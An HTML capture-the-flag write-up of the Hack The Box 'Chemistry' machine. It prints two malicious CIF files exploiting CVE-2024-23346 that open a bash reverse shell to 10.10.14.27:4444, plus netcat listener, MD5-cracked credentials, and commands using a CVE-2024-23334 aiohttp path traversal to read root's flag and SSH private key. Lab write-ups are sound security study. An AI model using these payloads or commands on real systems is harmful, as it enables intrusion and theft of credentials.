@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chemistry &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Chemistry/9e4d90cc-7f1b-4b2d-a48e-31ba0a202fba.png" alt="Chemistry machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Chemistry</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
+      <span class="badge">pymatgen / aiohttp</span>
+      <span class="badge">CVE-2024-23346</span>
+      <span class="badge">CVE-2024-23334</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User Access</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+  </ul>
+</nav>
+
+<blockquote class="callout">
+  <div class="callout-title">Key takeaways</div>
+  <ul>
+    <li><strong>CIF file upload</strong> &rarr; <strong>CVE-2024-23346</strong></li>
+    <li><strong>Credentials through the database</strong></li>
+    <li><strong>Local <code>aiohttp</code> server running</strong> &rarr; <strong>CVE-2024-23334</strong></li>
+  </ul>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>We start with the nmap enumeration.</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.38</div>
+
+<p>We can see that there are 2 ports open.</p>
+<ul>
+  <li>TCP 22</li>
+  <li>TCP 5000</li>
+</ul>
+
+<p>If we check port 5000, we can see that an HTTP web server is running.</p>
+<div class="terminal-box">nmap -sV -sC -p 5000 10.10.11.38</div>
+
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527001119.png" alt="nmap service scan result on port 5000" loading="lazy">
+</figure>
+
+<p>We register as a new user, and after logging in we can see that we can upload CIF files.</p>
+
+<p>We can download an example CIF file and check it.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527001217.png" alt="Example CIF file content" loading="lazy">
+</figure>
+
+<p>If we check the source code, we can see that <code>example.cif</code> is available at <code>/static/example.cif</code>.</p>
+
+<p>When searching for vulnerabilities in CIF files, I found several CVEs, but we will continue with <a href="https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346">CVE-2024-23346</a>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527002144.png" alt="CVE-2024-23346 advisory page" loading="lazy">
+</figure>
+
+<h2 id="foothold">Foothold</h2>
+<p>So we will add this to our <code>example.cif</code> file.</p>
+
+<p>1)</p>
+<div class="terminal-box">data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "</div>
+
+<p>Or this</p>
+<p>2)</p>
+<div class="terminal-box">data_Example
+_cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M 'P 1'
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+
+ H 0.00000 0.00000 0.00000 1
+ O 0.50000 0.50000 0.50000 1
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.27/4444 0>&1\'");0,0,0'
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "</div>
+
+<p>I used the second payload and uploaded it. Then I started a listener on my terminal.</p>
+<div class="terminal-box">nc -lvnp 4444</div>
+
+<p>I clicked the <code>View</code> button, and it triggered.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527002552.png" alt="Reverse shell triggered after clicking View" loading="lazy">
+</figure>
+
+<p>I now have a reverse shell as <code>app</code>.</p>
+
+<p>I upgraded the terminal.</p>
+<div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#Press Ctrl + Z
+
+stty raw -echo ; fg
+
+reset
+
+screen
+
+export TERM=xterm
+
+export SHELL=bash
+
+stty rows 40 columns 100</div>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527002732.png" alt="Upgraded terminal shell as app" loading="lazy">
+</figure>
+
+<h2 id="user">User Access</h2>
+<p>Then I found the python script <code>app.py</code> and read it. I could see that we have a SQLite database.</p>
+
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527002919.png" alt="app.py source code showing the SQLite database" loading="lazy">
+</figure>
+
+<p>So I searched for the <code>database.db</code> file and found it in the <code>~/instance</code> directory. There I used sqlite and found the hash for <code>rosa</code>.</p>
+
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003114.png" alt="Locating database.db in the instance directory" loading="lazy">
+</figure>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003129.png" alt="Password hash for user rosa from the SQLite database" loading="lazy">
+</figure>
+
+<p>While reading the <code>app.py</code> script, I found that the passwords are stored as MD5 hashes.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003217.png" alt="app.py code showing MD5 password hashing" loading="lazy">
+</figure>
+
+<p>So I cracked them using <a href="https://crackstation.net/">crackstation</a>.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">rosa</span> : <span class="pass">unicorniosrosados</span></code>
+</fieldset>
+
+<p>After this, we can SSH in and read the flag.</p>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h2 id="privesc">Privilege Escalation</h2>
+<p>I checked the initial traffic and found this.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003544.png" alt="Captured traffic showing a local service" loading="lazy">
+</figure>
+
+<p>There is a server running on localhost. So I started a local port forward.</p>
+<div class="terminal-box">ssh -L 8080:localhost:8080 rosa@10.10.11.38</div>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003715.png" alt="SSH local port forward to the hidden service on port 8080" loading="lazy">
+</figure>
+
+<p>I didn't find anything important this way.</p>
+
+<p>To check the server application that is running, I used this command as <code>rosa</code>.</p>
+<div class="terminal-box">curl -vvv 127.0.0.1:8080</div>
+
+<p>I found out that it is running <code>aiohttp/3.9.1</code>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527003929.png" alt="curl output showing aiohttp/3.9.1 server header" loading="lazy">
+</figure>
+
+<p>Then I searched for a vulnerability and found <a href="https://github.com/wizarddos/CVE-2024-23334">CVE-2024-23334</a>. I downloaded it and had to use the script like this.</p>
+<div class="terminal-box">python3 exploit.py -u [url] -f [file] -d [static directory]</div>
+
+<p>To find the static directory in this case, I had to search the source code, where I found <code>/assets</code>.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Chemistry/Pasted image 20250527004221.png" alt="Source code showing the /assets static directory" loading="lazy">
+</figure>
+
+<p>So I modified the script like this.</p>
+<div class="terminal-box">python3 exploit.py -u http://127.0.0.1:8080 -f /root/root.txt -d /assets</div>
+
+<p>This gave me the flag.</p>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<p>I could also take the root user's SSH key if I needed to connect.</p>
+<div class="terminal-box">python3 exploit.py -u http://127.0.0.1:8080 -f /root/.ssh/id_rsa -d /assets</div>
+
+</div>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
+</body>
+</html>
